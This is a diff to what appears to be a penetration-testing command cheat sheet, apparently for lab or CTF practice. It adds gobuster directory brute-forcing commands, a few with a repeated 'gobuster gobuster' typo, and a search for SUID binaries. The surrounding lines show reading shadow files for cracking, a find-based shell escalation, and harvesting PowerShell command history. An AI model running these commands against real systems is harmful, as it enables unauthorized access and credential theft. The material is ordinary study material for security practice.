@@ -162,6 +162,15 @@ sudo nping --icmp -c 1 10.10.27.8 --data-string "admin:password" #
 # =======
 sudo tcpdump -i eth0 udp port 53 -v  # Capturing DNS Requests
 
+# ========
+# GoBuster
+# ========
+
+gobuster dir -u <url> -w <wordlist> -e # -e for printing full path
+gobuster gobuster dir -u <url> -w <wordlist> -U <username> -P <password> # -U and -P for basic auth
+gobuster gobuster dir -u <url> -w <wordlist> -p <x>	# -p for Proxy to use for requests
+gobuster gobuster dir -u <url> -w <wordlist> -U <username> -P <password> -c <http_cookies>	# -c to Specify a cookie for simulating your auth
+
 
 # ========
 # icmpdoor
@@ -249,6 +258,7 @@ showmount -e <target-ip>
 sudo mount -o rw 10.10.223.238:/home/ubuntu/sharedfolder /tmp/sharedfolder
 sudo unshadow passwd.txt shadow.txt > cracked.txt
 sudo find . -exec /bin/sh \; -quit.
+find / -user root -perm -4000 -exec ls -ldb {} \; # All SUID files
 
 # Windows Privilege Escalation
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # Command History
